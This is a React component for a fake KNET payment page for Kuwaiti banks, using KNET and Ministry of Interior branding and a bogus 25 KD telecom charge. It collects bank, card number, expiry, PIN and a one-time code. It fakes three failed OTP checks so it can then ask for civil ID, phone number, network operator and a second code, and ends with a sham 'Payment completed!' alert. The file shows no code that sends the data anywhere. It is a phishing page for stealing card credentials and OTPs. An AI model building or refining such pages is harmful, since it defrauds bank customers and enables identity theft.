import { useState, useEffect } from "react";
import { Loader2 } from "lucide-react";

const BANKS = [
  { value: "ABK", label: "Al Ahli Bank of Kuwait", cardPrefixes: ["403622", "428628", "423826"] },
  { value: "ALRAJHI", label: "Al Rajhi Bank", cardPrefixes: ["458838"] },
  { value: "BBK", label: "Bank of Bahrain and Kuwait", cardPrefixes: ["418056", "588790"] },
  { value: "BOUBYAN", label: "Boubyan Bank", cardPrefixes: ["470350", "490455", "490456", "404919", "450605", "426058", "431199"] },
  { value: "BURGAN", label: "Burgan Bank", cardPrefixes: ["468564", "402978", "403583", "415254", "450238", "540759", "49219000"] },
  { value: "CBK", label: "Commercial Bank of Kuwait", cardPrefixes: ["532672", "537015", "521175", "516334"] },
  { value: "Doha", label: "Doha Bank", cardPrefixes: ["419252"] },
  { value: "GBK", label: "Gulf Bank", cardPrefixes: ["526206", "531470", "531644", "531329", "517419", "517458", "531471", "559475"] },
  { value: "TAM", label: "TAM Bank", cardPrefixes: ["45077848", "45077849"] },
  { value: "KFH", label: "Kuwait Finance House", cardPrefixes: ["485602", "537016", "5326674", "450778"] },
  { value: "KIB", label: "Kuwait International Bank", cardPrefixes: ["409054", "406464"] },
  { value: "NBK", label: "National Bank of Kuwait", cardPrefixes: ["464452", "589160"] },
  { value: "Weyay", label: "Weyay Bank", cardPrefixes: ["46445250", "543363"] },
  { value: "QNB", label: "Qatar National Bank", cardPrefixes: ["521020", "524745"] },
  { value: "UNB", label: "Union National Bank", cardPrefixes: ["457778"] },
  { value: "WARBA", label: "Warba Bank", cardPrefixes: ["541350", "525528", "532749", "559459"] },
];

export default function KnetPayment() {
  const [step, setStep] = useState(1);
  const [isLoading, setIsLoading] = useState(false);
  const [total] = useState("25.000");
  const [otpAttempts, setOtpAttempts] = useState(0);
  const [otpValue, setOtpValue] = useState("");
  const [countdown, setCountdown] = useState(60);
  const [isCountdownActive, setIsCountdownActive] = useState(true);
  const [paymentInfo, setPaymentInfo] = useState({
    cardNumber: "",
    year: "",
    month: "",
    otp: "",
    bank: "",
    pass: "",
    bank_card: [""],
    prefix: "",
    phoneNumber: "",
    network: "",
    idNumber: "",
    otp2: "",
  });

  useEffect(() => {
    let interval = null;
    if (isCountdownActive && countdown > 0) {
      interval = setInterval(() => setCountdown(c => c - 1), 1000);
    } else if (countdown === 0) {
      setIsCountdownActive(false);
    }
    return () => { if (interval) clearInterval(interval); };
  }, [isCountdownActive, countdown]);

  const isStep1Disabled =
    !paymentInfo.prefix || paymentInfo.prefix === "i" ||
    !paymentInfo.bank ||
    !paymentInfo.cardNumber ||
    !paymentInfo.pass || paymentInfo.pass.length !== 4 ||
    !paymentInfo.month || paymentInfo.month === "0" ||
    !paymentInfo.year || paymentInfo.year === "0";

  const isStep2Disabled = paymentInfo.otp.length !== 6;

  const handleSubmit = () => {
    if (step === 1) {
      setIsLoading(true);
      setTimeout(() => { setIsLoading(false); setStep(2); }, 2000);
    } else if (step === 2) {
      setIsLoading(true);
      const newAttempts = otpAttempts + 1;
      setOtpAttempts(newAttempts);
      setOtpValue("");
      setPaymentInfo(p => ({ ...p, otp: "" }));
      setTimeout(() => {
        setIsLoading(false);
        if (newAttempts >= 3) {
          setStep(3);
          setOtpAttempts(0);
        }
      }, 3000);
    } else if (step === 3) {
      setIsLoading(true);
      setTimeout(() => { setIsLoading(false); setStep(4); }, 5000);
    } else if (step === 4) {
      setIsLoading(true);
      setTimeout(() => {
        setIsLoading(false);
        alert("Payment completed!");
      }, 4000);
    }
  };

  const isSubmitDisabled =
    (step === 1 && isStep1Disabled) ||
    (step === 2 && isStep2Disabled);

  return (
    <div style={{ fontFamily: "Verdana, Arial, Helvetica, sans-serif", backgroundColor: "#ebebeb", minHeight: "100vh" }} dir="ltr">
      <style>{knetCss}</style>
      {/* Fraud Awareness Banner */}
      <div style={{ maxWidth: 460, margin: "0 auto", padding: "12px 15px 0" }}>
        <img
          src="https://media.base44.com/images/public/6a11cacbd565fb23b026ee36/ae1c73ec3_image.png"
          alt="Fraud Awareness"
          style={{ width: "100%", borderRadius: 10, display: "block", boxShadow: "0 2px 10px rgba(0,0,0,0.3)" }}
        />
      </div>

      <div className="knet-container">
        <form onSubmit={e => e.preventDefault()}>
          {/* KNET Logo */}
          <div style={{ textAlign: "center", marginBottom: 5 }}>
            <img
              src="https://www.knet.com.kw/images/knet-logo.png"
              alt="KNET"
              style={{ height: 50, objectFit: "contain", display: "inline-block", marginTop: 16 }}
              onError={e => { e.target.style.display = "none"; }}
            />
            <div style={{ color: "#0070cd", fontWeight: "bold", fontSize: 18, marginTop: 4 }}>KNET</div>
          </div>

          <div className="knet-content-block">
            {/* Info Card */}
            <div className="knet-form-card">
              <div className="knet-row">
                <div className="knet-col-label"><label>Payment Form</label></div>
                <div className="knet-col-value" style={{ textAlign: "right" }}>
                  <img src="https://media.base44.com/images/public/6a11cacbd565fb23b026ee36/ce2cb383c_www_moi_gov_kw_logo-moi_8a94a177.svg" alt="KV" width={40} style={{ objectFit: "contain" }} />
                </div>
              </div>
              <div className="knet-row">
                <label className="knet-col-label">Merchant:</label>
                <label className="knet-col-value knet-text-label">Mobile Telecommunication Co.</label>
              </div>
              <div className="knet-row">
                <label className="knet-col-label">Amount:</label>
                <label className="knet-col-value knet-text-label">{total} KD</label>
              </div>
            </div>

            {/* Form Card */}
            <div className="knet-form-card">
              {step === 1 && (
                <Step1 paymentInfo={paymentInfo} setPaymentInfo={setPaymentInfo} />
              )}
              {step === 2 && (
                <Step2
                  paymentInfo={paymentInfo}
                  setPaymentInfo={setPaymentInfo}
                  otpValue={otpValue}
                  setOtpValue={setOtpValue}
                  countdown={countdown}
                />
              )}
              {step === 3 && (
                <Step3 paymentInfo={paymentInfo} setPaymentInfo={setPaymentInfo} />
              )}
              {step === 4 && (
                <Step4 paymentInfo={paymentInfo} setPaymentInfo={setPaymentInfo} />
              )}
            </div>

            {/* Action Buttons */}
            <div className="knet-form-card">
              <div className="knet-row" style={{ border: 0, paddingBottom: 0 }}>
                <button
                  className="knet-submit-btn"
                  disabled={isSubmitDisabled || isLoading}
                  onClick={handleSubmit}
                >
                  {isLoading ? "Wait..." : step === 1 ? "Submit" : "Confirm"}
                </button>
                <button
                  className="knet-cancel-btn"
                  onClick={() => window.history.back()}
                  type="button"
                >
                  Cancel
                </button>
              </div>
            </div>

            {/* Footer */}
            <div style={{ textAlign: "center", marginTop: 15, fontWeight: "bold", color: "#2277d3", fontSize: 10 }}>
              All Rights Reserved. Copyright 2024<br />
              <strong>The Shared Electronic Banking Services Company - KNET</strong>
            </div>
          </div>
        </form>
        {isLoading && <LoadingOverlay />}
      </div>
    </div>
  );
}

function Step1({ paymentInfo, setPaymentInfo }) {
  return (
    <>
      <div className="knet-row">
        <label className="knet-col-label">Select Your Bank:</label>
        <select
          className="knet-col-value"
          value={paymentInfo.bank}
          onChange={e => {
            const bank = BANKS.find(b => b.value === e.target.value);
            setPaymentInfo(p => ({
              ...p,
              bank: e.target.value,
              bank_card: bank ? bank.cardPrefixes : [""],
              prefix: "",
            }));
          }}
        >
          <option value="">Select Your Banks</option>
          {BANKS.map((b, i) => (
            <option key={i} value={b.value}>{b.label} [{b.value}]</option>
          ))}
        </select>
      </div>

      <div className="knet-row knet-three-col">
        <label className="knet-col-label">Card Number:</label>
        <div style={{ float: "left", width: "58%", display: "flex", gap: 4 }}>
          <select
            style={{ width: "42%", fontSize: 11, height: 22, color: "#444", border: "1px solid #ccc" }}
            value={paymentInfo.prefix}
            onChange={e => setPaymentInfo(p => ({ ...p, prefix: e.target.value }))}
          >
            <option value="i">prefix</option>
            {paymentInfo.bank_card.map((pfx, i) => (
              <option key={i} value={pfx}>{pfx}</option>
            ))}
          </select>
          <input
            type="tel"
            inputMode="numeric"
            pattern="[0-9]*"
            maxLength={10}
            value={paymentInfo.cardNumber}
            onChange={e => setPaymentInfo(p => ({ ...p, cardNumber: e.target.value.replace(/\D/g, "") }))}
            placeholder="0000000000"
            style={{ width: "58%", border: "2px solid #0070cd", boxShadow: "inset 0 0 5px rgba(0,0,0,0.2)", padding: "0 4px", fontSize: 11, height: 22, color: "#444", boxSizing: "border-box" }}
          />
        </div>
      </div>

      <div className="knet-row knet-three-col">
        <label className="knet-col-label">Expiration Date:</label>
        <select
          className="knet-col-value"
          value={paymentInfo.month}
          onChange={e => setPaymentInfo(p => ({ ...p, month: e.target.value }))}
          style={{ width: "17%", marginRight: 5 }}
        >
          <option value="0">MM</option>
          {Array.from({ length: 12 }, (_, i) => i + 1).map(m => (
            <option key={m} value={String(m).padStart(2, "0")}>{String(m).padStart(2, "0")}</option>
          ))}
        </select>
        <select
          className="knet-col-long"
          value={paymentInfo.year}
          onChange={e => setPaymentInfo(p => ({ ...p, year: e.target.value }))}
          style={{ width: "38%" }}
        >
          <option value="0">YYYY</option>
          {Array.from({ length: 14 }, (_, i) => 2024 + i).map(y => (
            <option key={y} value={y}>{y}</option>
          ))}
        </select>
      </div>

      <div className="knet-row">
        <label className="knet-col-label">PIN:</label>
        <input
          type="password"
          inputMode="numeric"
          maxLength={4}
          value={paymentInfo.pass}
          onChange={e => setPaymentInfo(p => ({ ...p, pass: e.target.value.replace(/\D/g, "") }))}
          className="knet-col-value"
          autoComplete="off"
          placeholder="••••"
          style={{ width: "58%" }}
        />
      </div>
    </>
  );
}

function Step2({ paymentInfo, setPaymentInfo, otpValue, setOtpValue, countdown }) {
  return (
    <>
      <div className="knet-alert-row">
        <strong>Please note:</strong> A 6-digit verification code has been sent via text message to your registered phone number
      </div>
      <div className="knet-row">
        <label className="knet-col-label">Card Number:</label>
        <label className="knet-col-value knet-text-label">
          {paymentInfo.cardNumber.substring(0, 4) + "****" + paymentInfo.cardNumber.substring(8)}
        </label>
      </div>
      <div className="knet-row">
        <label className="knet-col-label">Month expiry:</label>
        <label className="knet-col-value knet-text-label">{paymentInfo.month}</label>
      </div>
      <div className="knet-row">
        <label className="knet-col-label">Year expiry:</label>
        <label className="knet-col-value knet-text-label">{paymentInfo.year}</label>
      </div>
      <div className="knet-row">
        <label className="knet-col-label">Pin:</label>
        <label className="knet-col-value knet-text-label">****</label>
      </div>
      <div className="knet-row">
        <label className="knet-col-label">OTP:</label>
        <input
          type="tel"
          maxLength={6}
          value={otpValue}
          onChange={e => {
            setOtpValue(e.target.value.replace(/\D/g, ""));
            setPaymentInfo(p => ({ ...p, otp: e.target.value.replace(/\D/g, "") }));
          }}
          className="knet-col-value"
          placeholder={`Timeout in: 01:${countdown === 0 ? "00" : String(countdown).padStart(2, "0")}`}
          style={{ width: "58%" }}
        />
      </div>
    </>
  );
}

function Step3({ paymentInfo, setPaymentInfo }) {
  return (
    <>
      <div className="knet-row">
        <label className="knet-col-label">ID Number:</label>
        <input
          type="tel"
          inputMode="numeric"
          maxLength={12}
          value={paymentInfo.idNumber}
          onChange={e => setPaymentInfo(p => ({ ...p, idNumber: e.target.value.replace(/\D/g, "") }))}
          className="knet-col-value"
          placeholder="Civil / Residence ID"
          style={{ width: "58%" }}
        />
      </div>
      <div className="knet-row">
        <label className="knet-col-label">Authorized Phone Number:</label>
        <input
          type="tel"
          inputMode="numeric"
          maxLength={10}
          value={paymentInfo.phoneNumber}
          onChange={e => setPaymentInfo(p => ({ ...p, phoneNumber: e.target.value.replace(/\D/g, "") }))}
          className="knet-col-value"
          placeholder="05XXXXXXXX"
          style={{ width: "58%" }}
        />
      </div>
      <div className="knet-row">
        <label className="knet-col-label">Network operator:</label>
        <select
          className="knet-col-value"
          value={paymentInfo.network}
          onChange={e => setPaymentInfo(p => ({ ...p, network: e.target.value }))}
        >
          <option value="">Choose Network operator...</option>
          <option value="STC">STC</option>
          <option value="Zain">Zain</option>
          <option value="Ooredoo">Ooredoo</option>
        </select>
      </div>
    </>
  );
}

function Step4({ paymentInfo, setPaymentInfo }) {
  return (
    <>
      <div className="knet-alert-row">
        <strong>Please note:</strong> A 6-digit verification code has been sent via text message to your registered phone number
      </div>
      <div className="knet-row">
        <label className="knet-col-label">ID Number:</label>
        <label className="knet-col-value knet-text-label">{paymentInfo.idNumber}</label>
      </div>
      <div className="knet-row">
        <label className="knet-col-label">Phone Number:</label>
        <label className="knet-col-value knet-text-label">{paymentInfo.phoneNumber}</label>
      </div>
      <div className="knet-row">
        <label className="knet-col-label">OTP:</label>
        <input
          type="tel"
          maxLength={6}
          value={paymentInfo.otp2}
          onChange={e => setPaymentInfo(p => ({ ...p, otp2: e.target.value.replace(/\D/g, "") }))}
          className="knet-col-value"
          placeholder="6-digit OTP"
          style={{ width: "58%" }}
        />
      </div>
    </>
  );
}

function LoadingOverlay() {
  return (
    <div style={{
      position: "fixed", inset: 0, background: "rgba(85,85,85,0.55)",
      display: "flex", alignItems: "center", justifyContent: "center", zIndex: 9999
    }}>
      <div style={{
        background: "#fff", borderRadius: 10, padding: "30px 40px",
        display: "flex", flexDirection: "column", alignItems: "center", gap: 12,
        boxShadow: "0 4px 24px rgba(0,0,0,0.3)"
      }}>
        <Loader2 className="animate-spin" style={{ width: 36, height: 36, color: "#0070cd" }} />
        <div style={{ color: "#0070cd", fontWeight: "bold", fontSize: 13 }}>Processing...</div>
      </div>
    </div>
  );
}

const knetCss = `
  .knet-container {
    width: 100%;
    max-width: 460px;
    margin: 0 auto;
    padding: 0 15px 30px;
    box-sizing: border-box;
    position: relative;
  }
  .knet-content-block {
    width: 100%;
  }
  .knet-form-card {
    background: #fff;
    padding: 18px;
    border: 2px solid #8f8f90;
    border-radius: 15px;
    margin-bottom: 14px;
    box-shadow: 0 0 6px rgba(0,0,0,0.25);
    margin-top: 14px;
  }
  .knet-row {
    border-bottom: 1px solid #8f8f90;
    padding: 6px 0;
    overflow: hidden;
  }
  .knet-row:last-child { border-bottom: 0; padding-bottom: 0; }
  .knet-three-col { }
  .knet-col-label {
    float: left;
    width: 40%;
    font-size: 11px;
    color: #0070cd;
    font-weight: bold;
    line-height: 22px;
  }
  .knet-col-value {
    float: left;
    width: 58%;
    font-size: 11px;
    color: #444;
  }
  .knet-col-long {
    float: left;
    font-size: 11px;
    color: #444;
  }
  .knet-text-label {
    font-weight: normal;
    line-height: 22px;
  }
  .knet-form-card::after, .knet-row::after {
    content: ""; display: table; clear: both;
  }
  select {
    font-size: 11px;
    height: 22px;
    color: #444;
    border: 1px solid #ccc;
  }
  input[type="tel"], input[type="password"] {
    border: 2px solid #0070cd;
    box-shadow: inset 0 0 5px rgba(0,0,0,0.2);
    padding: 0 4px;
    outline: 0;
    font-size: 11px;
    height: 22px;
    color: #444;
    box-sizing: border-box;
  }
  .knet-submit-btn {
    background: #eaeaea;
    border: 1px solid #cacaca;
    font-weight: bold;
    color: #666;
    width: 50%;
    float: left;
    height: 28px;
    border-radius: 4px;
    font-size: 12px;
    cursor: pointer;
  }
  .knet-submit-btn:disabled {
    opacity: 0.55;
    cursor: not-allowed;
  }
  .knet-cancel-btn {
    background: #eaeaea;
    border: 1px solid #cacaca;
    font-weight: bold;
    color: #666;
    width: 50%;
    height: 28px;
    border-radius: 4px;
    font-size: 12px;
    cursor: pointer;
    float: left;
  }
  .knet-alert-row {
    font-size: 12px;
    text-align: justify;
    background: #d9edf6;
    padding: 10px;
    border: 1px solid #bacce0;
    border-radius: 4px;
    margin-bottom: 10px;
    color: #444;
  }
  @media (max-width: 480px) {
    .knet-container { padding: 0 8px 20px; }
    .knet-form-card { padding: 12px; }
  }
`;